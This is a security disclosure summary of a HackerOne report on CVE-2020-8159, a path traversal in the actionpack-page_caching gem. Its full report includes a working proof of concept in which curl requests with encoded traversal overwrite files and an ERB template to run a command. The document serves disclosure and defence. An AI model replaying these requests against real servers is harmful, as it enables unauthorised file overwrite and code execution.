# Directory Traversal and Remote Code Execution in actionpack-page_caching

## Metadata
- **Source:** HackerOne
- **Report:** 519220 | https://hackerone.com/reports/519220
- **Submitted:** 2019-03-31
- **Reporter:** ooooooo_q
- **Program:** Rails/actionpack-page_caching
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Directory Traversal, Path Traversal, Remote Code Execution, Arbitrary File Write
- **CVEs:** CVE-2020-8159
- **Category:** memory-binary

## Summary
The actionpack-page_caching gem fails to validate and sanitize user-supplied path components in the cache_file() and cache_path() functions, allowing attackers to traverse directories using URL-encoded traversal sequences (e.g., %2f%2e%2e%2f). By crafting malicious requests, an attacker can write cached files to arbitrary locations on the filesystem, potentially overwriting application files including ERB templates to achieve remote code execution.

## Attack scenario
1. Attacker identifies a Rails application using actionpack-page_caching with page caching enabled on a vulnerable controller action
2. Attacker crafts a malicious URL containing URL-encoded directory traversal sequences (e.g., /books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest) that bypass insufficient path validation
3. The vulnerable cache_path() function fails to normalize or validate the traversal sequences, allowing the cache file to be written outside the intended public/ directory
4. Attacker overwrites existing application files by requesting paths that resolve to sensitive locations (e.g., app/views/books/show.text.erb)
5. If the overwritten file contains server-side template code with unescaped ERB tags, the injected code executes when the template is rendered
6. Attacker gains remote code execution on the application server through the compromised template file

## Root cause
The cache_file() and cache_path() functions in actionpack-page_caching perform minimal validation on the path parameter. While URI.parser.unescape() is called, the function does not normalize the path (e.g., resolve .. or .) or validate that the resulting cache file remains within the intended cache_directory. URL-encoded traversal sequences bypass basic checks and are written literally into the file path, enabling directory traversal attacks.

## Attacker mindset
An attacker would recognize that page caching mechanisms often trust user-supplied path components and fail to implement strict path canonicalization. By combining directory traversal with knowledge of application structure (view templates, configuration files), the attacker can escalate a simple file-write vulnerability into RCE by targeting template files processed with ERB evaluation.

## Defensive takeaways
- Always canonicalize and normalize file paths before use (e.g., File.expand_path, realpath) and verify the final path remains within the intended directory
- Reject or sanitize path components containing traversal sequences (.., .), including URL-encoded variants
- Use whitelisting approaches for acceptable path characters rather than blacklisting known bad patterns
- Implement strict validation that cache files remain within the designated cache_directory using path containment checks
- Disable page caching for dynamic content containing user-supplied data, or ensure such data is properly escaped
- Apply defense-in-depth: restrict file permissions on view templates and avoid caching files in locations where they can overwrite application code

## Variant hunting
Check for similar path traversal vulnerabilities in other Rails caching gems or custom caching implementations
Search for other gems or frameworks that use URI.parser.unescape() without subsequent path normalization on user input
Investigate cache mechanisms in other popular Ruby web frameworks for inadequate path validation
Look for similar patterns where file extensions are conditionally appended without preventing directory traversal in the base name
Examine other actionpack plugins that manipulate file paths based on request parameters

## MITRE ATT&CK
- T1190
- T1595
- T1083
- T1567
- T1105

## Notes
This vulnerability demonstrates the danger of insufficient input validation in file I/O operations, particularly when combining URL decoding with path operations. The PoC clearly shows both file write and RCE impacts. The vulnerability affects versions of actionpack-page_caching prior to patches implementing proper path canonicalization. The attack is practical and requires minimal attacker privileges—only the ability to make HTTP requests to the application.

## Full report
<details><summary>Expand</summary>

I found a directory traversal in `actionpack-page_caching`.
Some code may lead to RCE.


https://github.com/rails/actionpack-page_caching/blob/master/lib/action_controller/caching/pages.rb#L143

```ruby
  def cache_file(path, extension)
    if path.empty? || path =~ %r{\A/+\z}
      name = "/index"
    else
      name = URI.parser.unescape(path.chomp("/"))
    end

    if File.extname(name).empty?
      name + (extension || default_extension)
    else
      name
    end
  end

  def cache_path(path, extension = nil)
    File.join(cache_directory, cache_file(path, extension))
  end
```

The problem is that traversal is not considered in cache_path or cache_file.
Since the URL can use `.` or` / `encoded values, the cache will be written in an unexpected place.

### PoC

#### step 1. Prepare server

```log
ruby -v

rails -v

rails new caching_traversal

cd caching_traversal

# add `gem "actionpack-page_caching"` in Gemfile

bundle install

rails generate scaffold book name:string
rails db:migrate
```

#### step 2. Setting cache

Enable caching.

```log
rails dev:cache
```

Add `caches_page`.

```ruby
# app/controllers/books_contorller.rb
class BooksController < ApplicationController
  before_action :set_book, only: [:show, :edit, :update, :destroy]

  caches_page :show
```

#### step 3. Start server

Start the server with "rails s".

Prepare a book with the following name.

```
<% `toouch me` %>
```


Check cache behavior.

```log
❯ curl "http://localhost:3000/books/1"
<!DOCTYPE html>
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...

❯ ls public
404.html  500.html                          apple-touch-icon.png  favicon.ico
422.html  apple-touch-icon-precomposed.png  books                 robots.txt

❯ cat public/books/1.html
<!DOCTYPE html>
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...

```


#### step 4. Attack 

Add an attack code to the pass and check the result.

```log
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest"

# test file is generated
❯ ls
app  config     db       Gemfile.lock  log           public    README.md  test       tmp
bin  config.ru  Gemfile  lib           package.json  Rakefile  storage    test.html  vendor


❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd"

# If the file exists it will be overwritten
❯ cat README.md
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...
```

#### step 5. RCE

RCE is possible if it is possible to create a cache where the value of `<%` is not escaped, like render for text.

Generate the file `app/views/books/show.text.erb` as follows:


```
name: <%= @ book.name %>
```

Overwriting erb files enables RCE.

```log
# overwrite erb
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text"
name: <% `touch me` %>

❯ cat app/views/books/show.text.erb
name: <% `touch me` %>


# executed `touch me`
❯ curl "http://localhost:3000/books/1.txt"
name:

# me file is generated
❯ ls
app  config     db       Gemfile.lock  log  package.json  Rakefile   storage  test.html  vendor
bin  config.ru  Gemfile  lib           me   public        README.md  test     tmp
```

## Impact

The cache is generated on an unintended path. Also, RCE may be possible.

</details>

---
*Analysed by Claude on 2026-05-24*
